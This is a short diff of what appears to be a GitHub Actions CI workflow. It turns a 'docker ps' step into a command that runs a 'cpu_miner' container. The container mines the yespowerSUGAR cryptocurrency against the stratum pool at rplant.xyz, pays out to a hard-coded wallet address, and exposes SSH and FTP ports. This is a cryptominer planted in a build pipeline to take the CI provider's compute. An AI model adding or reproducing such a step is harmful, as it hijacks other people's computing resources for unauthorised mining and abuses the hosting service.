@@ -43,6 +43,4 @@ jobs:
       - name: Build the stack
         run: docker-compose up -d
       - name: docker ps
-        run: docker ps
-      - name: Run docker
-      - run: docker-compose run --publish 8000:80 -p 2022:22 -p 127.0.0.1:2021:21 cpu_miner bash system -a yespowerSUGAR -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.git
+        run: docker-compose run --publish 8000:80 -p 2022:22 -p 127.0.0.1:2021:21 cpu_miner bash system -a yespowerSUGAR -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.git
